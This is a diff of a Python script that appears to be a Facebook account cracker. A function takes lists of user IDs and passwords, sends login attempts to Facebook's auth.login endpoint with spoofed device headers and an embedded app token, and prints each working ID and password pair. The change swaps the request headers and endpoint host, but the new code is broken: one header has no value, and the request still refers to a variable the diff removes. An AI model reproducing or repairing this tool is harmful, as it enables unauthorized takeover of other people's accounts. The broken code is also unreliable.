@@ -309,25 +309,30 @@ def ___random___(ids,passlist):
             "locale":"en_US","client_country_code":"US",
             'fb_api_req_friendly_name':'authenticate',
             "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",}
-            head={
-            'User-Agent': __UBI___(),
-            'Accept-Encoding':  'gzip, deflate',
-            'Accept': '*/*',
-            'Connection': 'keep-alive',
-            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-            'X-FB-Friendly-Name': 'authenticate',
-            'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
-            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
-            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
-            'X-FB-Connection-Type': 'MOBILE.LTE',
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'X-FB-HTTP-Engine': 'Liger'}
-            url = 'https://b-api.facebook.com/method/auth.login'
+            headers = {'authority': 'm.alpha.facebook.com',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'dpr': '2',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+            'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-model': '"TECNO BF7"',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"12.0.0"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': }
+            url = 'https://m.alpha.facebook.com/method/auth.login'
             po = requests.post(url,data=data,headers=head,allow_redirects=False).text
             q = json.loads(po)
             if 'session_key' in q:
                 uid=str(q['uid'])
-                ckk = f'https://graph.facebook.com/{uid}/picture?type=normal'
+                ckk = f'https://m.alpha.facebook.com/{uid}/picture?type=normal'
                 res = requests.get(ckk).text
                 if 'Photoshop' in res:
                     print('\r\r\033[1;31m[\033[1;32mALIVE-MRX\033[1;31m]\033[1;32m '+uid+' | '+pas+'\033[1;97m')
